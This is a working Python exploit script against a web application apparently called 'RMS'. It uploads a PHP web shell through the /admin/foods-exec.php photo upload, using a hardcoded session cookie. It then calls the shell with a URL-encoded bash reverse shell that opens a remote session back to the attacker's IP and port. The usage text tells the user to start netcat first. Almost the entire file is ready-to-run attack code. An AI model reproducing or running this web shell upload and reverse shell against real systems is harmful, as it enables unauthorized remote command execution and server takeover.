#!/usr/bin/python
import requests as rq
import sys


print(""" 

########  ##     ##  ######          ##     ## ##     ## ##    ## ######## 
##     ## ###   ### ##    ##         ##     ## ##     ## ###   ##    ##    
##     ## #### #### ##               ##     ## ##     ## ####  ##    ##    
########  ## ### ##  ######          ######### ##     ## ## ## ##    ##    
##   ##   ##     ##       ##         ##     ## ##     ## ##  ####    ##    
##    ##  ##     ## ##    ##         ##     ## ##     ## ##   ###    ##    
##     ## ##     ##  ######  ####### ##     ##  #######  ##    ##    ##    

""")


print("""
[!]Usage python3 exploit_file.py target_url 
python3 rms_exploit.py http://xxx.com/rms/ 1234 10.10.10.10
[!]Don't forget to start netcat before running the script!
""")


main_url = sys.argv[1]
port = sys.argv[2]
host_ip = sys.argv[3]
target_path = '/admin/foods-exec.php'
target_url = main_url + target_path

req_header = {

    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0)Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478",
    "Connection": "close",
    #"Referer": "http://localhost:8081/rms/admin/foods.php", --optional
    "Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
    "Upgrade-Insecure-Requests": "1"

}


req_data = """

-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="shell.php"
Content-Type: text/html

<?php echo shell_exec($_GET["cmd"]); ?>
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--

"""

try:

    upload_request = rq.post(target_url, verify=False, headers=req_header, data=req_data)

    encoded_payload_url = main_url + f'images/shell.php?cmd=bash -i >%26 %2fdev%2ftcp%2f{host_ip}%2f{port} 0>%261'

    print("[!]Shell payload uploaded. Payload url: " + encoded_payload_url)

    shell_request = rq.post(encoded_payload_url)
    #req_response = rq.Response() --optional

except: "[!]Payload failed to load/Shell session failed to start"
    

